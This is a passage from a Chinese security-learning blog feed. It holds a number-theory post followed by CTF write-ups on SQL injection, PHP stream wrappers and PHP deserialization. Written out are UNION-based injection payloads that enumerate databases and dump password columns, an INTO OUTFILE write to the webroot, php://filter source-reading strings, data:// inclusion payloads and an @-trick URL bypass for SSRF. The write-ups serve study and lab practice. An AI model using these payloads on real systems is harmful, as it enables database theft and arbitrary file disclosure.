class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-type">int</span> t,i;<br><span class="hljs-type">int</span> m,n,a,b;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;t);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">1</span>;i&lt;=t;i++)&#123;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);<br><span class="hljs-type">int</span> k=m/n;<span class="hljs-comment">//求出ab</span><br>    <span class="hljs-keyword">for</span>(a=<span class="hljs-number">1</span>;a&lt;=<span class="hljs-built_in">sqrt</span>(m/n);a++)&#123;<br>b=k/a;<br><span class="hljs-keyword">if</span>(max(a,b)==<span class="hljs-number">1</span> &amp;&amp; a*b==k)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d\n&quot;</span>,a*n,b*n);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">max</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)</span>&#123;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">while</span>(x!=y)&#123;<br><span class="hljs-keyword">if</span>(x&gt;y)<br>x=x-y;<br><span class="hljs-keyword">if</span>(x&lt;y)<br>y=y-x;<br>&#125;<br>i=x;<br><span class="hljs-keyword">return</span> i; &#125;<br></code></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mi>b</mi><mo>&#x3D;</mo><mo stretchy="false">[</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">]</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>&#x3D;</mo><mi>m</mi><mtext> </mtext><mi>n</mi><mtext>  </mtext><mo>⟺</mo><mtext>  </mtext><mfrac><mi>a</mi><mi>n</mi></mfrac><mfrac><mi>b</mi><mi>n</mi></mfrac><mo>&#x3D;</mo><mfrac><mi>m</mi><mi>n</mi></mfrac></mrow><annotation encoding="application/x-tex"><br>ab&#x3D;<a href="a,b">a,b</a>&#x3D;m,n<br>\iff \frac{a}{n} \frac{b}{n} &#x3D; \frac{m}{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">ab</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.549em;vertical-align:-0.024em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⟺</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2251em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&#x3D;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0404em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6954em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><br>什么意思呢？公式两边除以n平方，那么根据这条定理:<br><img src="/dong.github/images/0916-18.png"><br>只需要枚举找到这两个互素的数就可以找到a,b了，大大减少了循环次数，是不是很神奇。</p>        </div>      </div>    </div><p><strong>The End.</strong></p><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>王鑫教授的课件<br>《信息安全数学基础》(任伟)<br><a href="https://en.wikipedia.org/wiki/Euclidean_algorithm">维基百科-欧几里得算法</a><br><a href="https://blog.junyu33.me/2024/09/13/exgcd">OI选手现充|junyu33博客</a></p>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>信息安全数学基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Math</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入-无过滤注入</title>
    <link href="/dong.github/2024/09/01/sqlinjection1/"/>
    <url>/dong.github/2024/09/01/sqlinjection1/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>SQL无过滤注入CTFshow171-175</strong></p><span id="more"></span><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,database() --+寻找当前库名</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata<span class="hljs-comment">--+寻找所有库名</span><br><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;--+寻找表名 </span><br><span class="hljs-string"></span><br><span class="hljs-string">-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;ctfshow_web &#x27;</span><span class="hljs-comment">--+寻找列名</span><br><br><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(password) from ctfshow_user2--+寻找flag</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><blockquote><h1 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h1><ul><li>group_concat()将查询结果打包在一起返回，便于观察</li><li>–+表示将之后的内容注释掉，以及其他一些方式注释掉之后内容</li><li>使用union select需要让前边语句结果为假(-1’)，或者添加’1&#x3D;1’</li></ul></blockquote><h1 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h1><h2 id="CTFShow174："><a href="#CTFShow174：" class="headerlink" title="CTFShow174："></a>CTFShow174：</h2><p><img src="/dong.github/images/0901-5.png" alt="alt text"></p><h2 id="CTFShow175"><a href="#CTFShow175" class="headerlink" title="CTFShow175:"></a>CTFShow175:</h2><blockquote><p>‘ union select username, password from ctfshow_user5 into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt’ –+</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/dong.github/2024/09/01/sqlinjection/"/>
    <url>/dong.github/2024/09/01/sqlinjection/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>SQL注入原理及注入基础。</strong></p><span id="more"></span><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a><strong>SQL</strong></h1><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><blockquote><p>在计算机中存储数据，不仅要考虑如何将数据结构化地存储，更高效地利存储空间，还要考虑如何快速增、删、改、查，因此，SQL应运而生。</p></blockquote><p>SQL（Structured Query Language）是一种特殊目的的编程语言，用于管理和操作关系数据库系统。它允许用户定义、查询、更新和管理数据库中的数据。SQL 是大多数数据库系统的标准语言，包括 MySQL、PostgreSQL、SQLite、Oracle、SQL Server 等。</p><p><strong>也就是说，MySQL是数据库软件，而SQL是使用这类软件的一种通用编程语言。</strong></p><h1 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a><strong>SQL语句</strong></h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>创建表<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Employees (  <br>    EmployeeID <span class="hljs-type">int</span>,  <br>    LastName <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>),  <br>    FirstName <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>),  <br>    Position <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>)  <br>);<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>插入数据<br><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> Employees (EmployeeID, LastName, FirstName, Position)  <br><span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;Smith&#x27;</span>, <span class="hljs-string">&#x27;John&#x27;</span>, <span class="hljs-string">&#x27;Software Engineer&#x27;</span>);<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询数据<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> Employees;<br>或者<br><span class="hljs-keyword">SELECT</span> FirstName, LastName <span class="hljs-keyword">FROM</span> Employees <span class="hljs-keyword">WHERE</span> Position <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Software Engineer&#x27;</span>;<br><br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>更新数据<br><span class="hljs-keyword">UPDATE</span> Employees <span class="hljs-keyword">SET</span> Position <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Senior Software Engineer&#x27;</span> <span class="hljs-keyword">WHERE</span> EmployeeID <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>删除数据<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> Employees <span class="hljs-keyword">WHERE</span> EmployeeID <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>创建索引<br><span class="hljs-keyword">CREATE</span> INDEX idx_lastname <span class="hljs-keyword">ON</span> Employees(LastName);<br><br></code></pre></td></tr></table></figure><h2 id="实际编程中的SQL"><a href="#实际编程中的SQL" class="headerlink" title="实际编程中的SQL"></a>实际编程中的SQL</h2><p>在实际编程中，通过创建与数据库管理软件的接口，实现对数据库的管理。由此，出现了SQL注入这样的漏洞：<br>例如这样的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select username,password from user where  id = &#x27;.<span class="hljs-subst">$_GET</span>[&#x27;id&#x27;].&#x27;;&quot;</span>;<br></code></pre></td></tr></table></figure><p><strong>通过改变用GET方式传递的参数，使得单引号提前闭合，再将后边的内容注释掉，就可以实现一条完整的SQL语句，而这次查询的内容却可以被客户端控制。</strong></p><p>例如，id&#x3D;1时，查询结果正常，返回一条结果。<br>而id&#x3D;1’ or 1&#x3D;1 –+时，返回了所有数据，这时的查询语句变成了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select username,password from user where  id = 1 or 1=1;&quot;</span><br>即<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select username,password from user where 所有数据&quot;</span><br></code></pre></td></tr></table></figure><p>通过了解数据库的结构，可以在数据库中查到所需的数据。<br>这里通过Navicat Premium的图形界面，展示一个标准的数据库的结构：</p><p><img src="/dong.github/%5Cimages%5C0901-2.png" alt="image.png"></p><p>MySQL一经创建，就存在了information_schema、mysql、performance_schema、sys这几个库，类似默认文件，它们存储着整个数据库所有的重要信息，库名、表名、列名等等，SQL注入通常从这里下手，根据得到的信息不断深入，锁定所需的信息位置，最后获取数据。<br><img src="/dong.github/images/0901-1.png" alt="image1.png"><br><img src="/dong.github/images/0901-2.png" alt="image2.png"></p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h1><h2 id="典型查找流程：爆库名-爆表名-爆字段名（列名）-查询"><a href="#典型查找流程：爆库名-爆表名-爆字段名（列名）-查询" class="headerlink" title="典型查找流程：爆库名-爆表名-爆字段名（列名）-查询"></a><strong>典型查找流程：爆库名-爆表名-爆字段名（列名）-查询</strong></h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1&#x27; or 1=1 union select 1,2,database()--+<br><br>1&#x27; or 1=1 union select 1,2,group<span class="hljs-emphasis">_concat(table_</span>name) from information<span class="hljs-emphasis">_schema.tables where table_</span>schema=&#x27;ctfshow<span class="hljs-emphasis">_web&#x27;--+</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">1&#x27; or 1=1 union select 1,2,group_</span>concat(column<span class="hljs-emphasis">_name) from information_</span>schema.columns where table<span class="hljs-emphasis">_schema=&#x27;ctfshow_</span>web&#x27; and table<span class="hljs-emphasis">_name=&#x27;ctfshow_</span>user2&#x27;--+<br><br>-1&#x27; or 1=1 union select 1,group<span class="hljs-emphasis">_concat(column_</span>name) from information<span class="hljs-emphasis">_schema.columns where table_</span>schema=&#x27;ctfshow<span class="hljs-emphasis">_web &#x27;--+</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">1&#x27; or 1=1 union select 1,2,group_</span>concat(password) from ctfshow<span class="hljs-emphasis">_user2--+</span><br><span class="hljs-emphasis"></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php伪协议</title>
    <link href="/dong.github/2024/09/01/fakeprotocol/"/>
    <url>/dong.github/2024/09/01/fakeprotocol/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>php伪协议整理。</strong></p><span id="more"></span><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">1</span> file:// — 访问本地文件系统<br><span class="hljs-number">2</span> http:// — 访问 <span class="hljs-built_in">HTTP</span>(s) 网址<br><span class="hljs-number">3</span> ftp:// — 访问 <span class="hljs-built_in">FTP</span>(s) URLs<br><span class="hljs-number">4</span> php:// — 访问各个输入/输出流（I/O streams）<br><span class="hljs-number">5</span> zlib:// — 压缩流<br><span class="hljs-number">6</span> data:// — 数据（RFC）<br><span class="hljs-number">7</span> glob:// — 查找匹配的文件路径模式<br><span class="hljs-number">8</span> phar:// — PHP 归档<br><span class="hljs-number">9</span> ssh2:// — Secure Shell <span class="hljs-number">2</span><br><span class="hljs-number">10</span> rar:// — RAR<br><span class="hljs-number">11</span> ogg:// — 音频流<br><span class="hljs-number">12</span> expect:// — 处理交互式的流<br>-----------------------php支持的伪协议-------------------------------------------------------<br></code></pre></td></tr></table></figure><p><strong>PHP的伪协议提供了一种灵活且强大的方式来访问和操作各种类型的资源。通过熟练使用这些伪协议，可以在PHP中实现更多高级和有趣的功能，提升开发效率和应用的功能性。无论是处理网络资源，还是进行高效的数据流操作，了解并掌握PHP的伪协议都将是宝贵的技能之一。</strong></p><p><strong>条件：</strong></p><blockquote><ul><li><code>allow_url_fopen</code>:off&#x2F;on</li><li><code>allow_url_include</code> :off</li></ul></blockquote><ul><li><code>php://input  </code></li><li><code>php://stdin  </code></li><li><code>php://memory </code></li><li><code>php://temp </code></li></ul><p> 需要allow_url_include:on</p><h1 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h1><h2 id="php-filter（用于读取）"><a href="#php-filter（用于读取）" class="headerlink" title="php:&#x2F;&#x2F;filter（用于读取）"></a>php:&#x2F;&#x2F;filter（用于读取）</h2><p>php:&#x2F;&#x2F;filter是一种元封装器，设计用于数据流打开时的筛选过滤使用。</p><p>=&gt;是一个中间件，<strong>在读入或写入数据的时候对数据进行处理后输出</strong></p><blockquote><p><strong>php:filter可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。</strong></p><p><strong>所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</strong></p></blockquote><p><strong>协议参数:</strong></p><table><thead><tr><th align="left"><strong>名称</strong></th><th align="left"><strong>描述</strong></th></tr></thead><tbody><tr><td align="left">resource&#x3D;&lt;要过滤的数据流&gt;</td><td align="left">这个参数是必须的，它指定了要过滤的数据流</td></tr></tbody></table><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">php://filter/read=convert.base64-encode/resource=index.php<br>php://filter/resource=index.php<br></code></pre></td></tr></table></figure><blockquote><p><code>将index.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。</code></p><p><code>而使用的convert.base64-encode，就是一种过滤器。</code></p></blockquote><h2 id="php-input（用于执行）"><a href="#php-input（用于执行）" class="headerlink" title="php:&#x2F;&#x2F;input（用于执行）"></a>php:&#x2F;&#x2F;input（用于执行）</h2><p>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</p><h1 id="data-协议"><a href="#data-协议" class="headerlink" title="data:&#x2F;&#x2F;协议"></a>data:&#x2F;&#x2F;协议</h1><p><strong>条件：</strong></p><blockquote><ul><li><code>allow_url_fopen:on</code></li><li><code>allow_url_include :on</code></li></ul></blockquote><p><strong>数据流封装器，以传递相应格式的数据，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</strong></p><blockquote><ul><li><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</li></ul></blockquote><pre><code class="hljs">data://text/plain,data://text/plain;base64,</code></pre><h1 id="file-协议"><a href="#file-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h1><p><strong>file:&#x2F;&#x2F; 协议在双off的情况下也可以正常使用；</strong></p><p><strong>allow_url_fopen ：off&#x2F;on</strong></p><p><strong>allow_url_include：off&#x2F;on</strong></p><blockquote><p>file:&#x2F;&#x2F; 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p></blockquote><h1 id="http-https-协议"><a href="#http-https-协议" class="headerlink" title="http:&#x2F;&#x2F;&amp;https:&#x2F;&#x2F;协议"></a>http:&#x2F;&#x2F;&amp;https:&#x2F;&#x2F;协议</h1><p><strong>条件</strong>：</p><blockquote><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></blockquote><ul><li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p></li><li><p><strong>用法</strong>：</p><pre><code class="hljs">http://example.comhttp://example.com/file.php?var1=val1&amp;var2=val2http://user:password@example.comhttps://example.comhttps://example.com/file.php?var1=val1&amp;var2=val2https://user:password@example.com</code></pre></li></ul><h1 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:&#x2F;&#x2F;协议"></a>phar:&#x2F;&#x2F;协议</h1><p>phar:&#x2F;&#x2F;协议类似zip:&#x2F;&#x2F;，同样可以访问zip 格式压缩包内容。</p><p><a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面 (seebug.org)</a></p><h1 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h1><h2 id="2024MoeCTF-ImageCloud前置"><a href="#2024MoeCTF-ImageCloud前置" class="headerlink" title="2024MoeCTF-ImageCloud前置"></a>2024MoeCTF-ImageCloud前置</h2><p><img src="/dong.github/images/0901-3.png" alt="alt text"><br>看到url?&#x3D;，这是一个典型的URL重定向（URL Redirection）漏洞，推测出题人在考察伪协议。<br>结合题目描述，考虑file:&#x2F;&#x2F;，直接读取本地文件，获取flag。</p><h2 id="2024BaseCTF-Aura酱的礼物"><a href="#2024BaseCTF-Aura酱的礼物" class="headerlink" title="2024BaseCTF-Aura酱的礼物"></a>2024BaseCTF-Aura酱的礼物</h2><p><img src="/dong.github/images/0901-4.png" alt="alt text"><br>第一个判断，需要把一个文件当作字符串读入，读入后的字符串等于”Aura”<br>想到data:&#x2F;&#x2F;，两种方法：<br>data:&#x2F;&#x2F;text&#x2F;plain,Aura<br>data:&#x2F;&#x2F;text&#x2F;plain;base64,QXVyYQ&#x3D;&#x3D;</p><p>第二个判断，要求页面开头为<code>http://jasmineaura.github.io</code><br>可以利⽤ @ 来进⾏隔断, 将 @ 前⾯的内容当做⽤⼾名,后面变成了需要转到的地址（SSRF漏洞）。</p><p>第三个的话是⼀个 include 点,flag在php文件的注释部分，使用data协议或其他会让flag.php被执行，无法查看注释。<br>这时就需要使用php:&#x2F;&#x2F;filter：<br>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>phpfakeprotocol</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化</title>
    <link href="/dong.github/2024/09/01/phpserilize/"/>
    <url>/dong.github/2024/09/01/phpserilize/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>php反序列化原理及注入基础。</strong></p><span id="more"></span><p><strong>序列化是对象串行化,对象是一种在内存中存储的数据类型,寿命是随生成该对象的程序的终止而终止,为了持久使用对象的状态,将其通过serialize()函数进行序列化为一行字符串保存为文件,使用时再用unserialize()反序列化为对象。</strong></p><h2 id="序列化举例"><a href="#序列化举例" class="headerlink" title="序列化举例"></a><strong>序列化举例</strong></h2><pre><code class="hljs">数组：a:&lt;length&gt;:&#123;key, value pairs&#125;;a:1:&#123;i:1;s:1:&quot;a&quot;;&#125;对象：O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;;O:6:&quot;person&quot;:3:&#123;s:4:&quot;name&quot;;N;s:3:&quot;age&quot;;i:19;s:3:&quot;sex&quot;;N;&#125;</code></pre><blockquote><p>这部分内容适宜搭建合适的php运行和调试环境学习：</p></blockquote><blockquote><p>环境推荐：小皮面板+sublimetext</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;!-- <br><span class="hljs-comment">//序列化：将PHP对象压缩并按照一定格式转换成字符串的过程</span><br><span class="hljs-comment">//反序列化：从字符串转换回PHP对象的过程</span><br><br><span 